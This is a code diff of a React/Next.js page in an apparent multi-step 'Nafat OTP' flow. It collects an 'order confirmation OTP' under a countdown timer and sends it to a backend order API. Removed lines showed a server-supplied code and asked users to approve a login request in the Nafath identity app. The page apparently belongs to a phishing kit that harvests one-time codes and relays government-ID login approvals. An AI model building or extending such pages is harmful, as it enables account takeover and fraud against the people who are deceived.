@@ -1,38 +1,18 @@
-import { FaArrowRightLong } from 'react-icons/fa6'
 import { useRouter, useSearchParams } from 'next/navigation'
 
-import { useCallback, useEffect, useState } from 'react'
+// Import Swiper styles
+import { FaArrowRightLong } from 'react-icons/fa6'
+import { useEffect, useState } from 'react'
+import toast from 'react-hot-toast'
 import SwiperSlider from '@/components/SwiperSlider'
 
 const OrderConfirmationOtp = () => {
   const router = useRouter()
-  const params = useSearchParams()
-  const _id = params.get('id')
-
-  // get order data from api localhost:3000/api/order/:id
-  const [order, setOrder] = useState([])
-
-  const handleSubmit = (e) => {
-    e.preventDefault()
-    router.push({
-      pathname: '/nafat-otp-three',
-      query: { id: params.get('id') },
-    })
-  }
-
+  const searchParams = useSearchParams()
+  const params = new URLSearchParams(searchParams)
   // a countdown timer function
   const [time, setTime] = useState(180)
-
-  const url = `${process.env.API_URL}/api/order/${_id}`
-
-  const fetchOrder = useCallback(async () => {
-    const response = await fetch(url)
-    const data = await response.json()
-    setOrder(data)
-  }, [url])
-
   useEffect(() => {
-    fetchOrder()
     const timer = setInterval(() => {
       setTime((prevTime) => {
         if (prevTime === 0) {
@@ -42,64 +22,80 @@ const OrderConfirmationOtp = () => {
         return prevTime - 1
       })
     }, 1000)
-
     return () => clearInterval(timer)
-  }, [fetchOrder])
+  }, [])
 
-  const reload = () => {
-    window.location.reload()
+  const handleSubmit = (e) => {
+    e.preventDefault()
+    const submitData = {
+      orderConfirmationOtp: e.target.orderConfirmationOtp.value,
+    }
+    // console.log("submitData", submitData);
+    // console.log('params.get(id)', params.get('id'))
+    if (submitData.orderConfirmationOtp === '') {
+      toast.error('Please enter your order confirmation otp')
+    } else {
+      // post all the data through api localhost:3000/api/order
+      fetch(`${process.env.API_URL}/api/order/${params.get('id')}`, {
+        method: 'PATCH',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(submitData),
+      })
+        .then((res) => res.json())
+        .then((data) => {
+          // console.log('data', data)
+          if (data) {
+            router.push({
+              pathname: '/nafat-otp-three',
+              query: { id: data._id },
+            })
+          } else {
+            toast.error('Please enter correct otp')
+          }
+        })
+    }
   }
 
   return (
     <>
+      {/* create a form so that I can add user-name, email, phone number etc add some design also */}
       <SwiperSlider />
       <div className="max-w-[1400px] mx-auto flex flex-col justify-center items-center ">
-        <h1 className="text-4xl font-bold text-gray-600 mt-10">
-          Order Confirmation Otp
-        </h1>
+        <h1 className="text-4xl font-bold text-gray-600 mt-10">Order Confirmation OTP</h1>
         {/* a countdown timer for 180s design */}
-        <div className="flex justify-center items-center gap-2 my-5 border-4 h-28 w-28 rounded-full">
+        <div className="flex justify-center items-center gap-2 mt-5 border-4 h-28 w-28 rounded-full">
           <h1 className="text-2xl font-bold text-gray-600 m-0">
             {Math.floor(time / 60)}:
           </h1>
           <h1 className="text-2xl font-bold text-gray-600 m-0">{time % 60}</h1>
         </div>
-        {/* <p className="text-gray-600 text-center mt-5 font-bold">
-          رجى قبول طلب تسجيل الدخول من تطبيق نفاذ
-        </p>
-        <p className="text-gray-600 text-center my-5 font-bold">
-          Please accept the login request from Nafath app
-        </p> */}
-        {/* a countdown design round border */}
-        <div className="flex justify-center items-center gap-2 rounded-full border-2 h-16 w-16">
-          <p className="text-gray-600 text-center m-0 font-bold">
-            {order?.orderConfirmationOtp ? order?.orderConfirmationOtp : 'N/A'}
-          </p>
-        </div>
-        {/* <Link
-          href="https://play.google.com/store/apps/details?id=sa.gov.nic.myid"
-          target="_blank"
-          className="py-3 mt-4 px-5 w-fit text-gray-600 hover:text-white hover:bg-teal-500 font-bold border-gray-500 hover:border-teal-500 border text-sm flex items-center gap-2 justify-center rounded-sm transition-all delay-150 ease-in-out"
-        >
-          OPEN NAFATH APP
-        </Link> */}
-        {order.orderConfirmationOtp ? (
-          <form onSubmit={handleSubmit} className="w-3/4 my-14">
-            <button
-              type="submit"
-              className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
+
+        <form onSubmit={handleSubmit} className="w-3/4 my-14">
+          <div className="relative z-0 w-full mb-6 group">
+            <input
+              type="number"
+              name="orderConfirmationOtp"
+              id="orderConfirmationOtp"
+              className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none  dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
+              placeholder=""
+              required
+            />
+            <label
+              htmlFor="firstOtp"
+              className="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
             >
-              Continue To Nafat otp 3 <FaArrowRightLong size={16} />
-            </button>
-          </form>
-        ) : (
+              Enter Order Confirmation OTP
+            </label>
+          </div>
           <button
-            onClick={reload}
-            className="flex gap-2 justify-center items-center rounded-sm font-bold my-14 w-3/4 px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-gray-500 hover:bg-gray-600 focus:outline-none focus:bg-gray-600"
+            type="submit"
+            className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
           >
-            Reload Page
+            Next <FaArrowRightLong size={16} />
           </button>
-        )}
+        </form>
       </div>
       <div className="h-20 bg-teal-400 mt-5"></div>
     </>
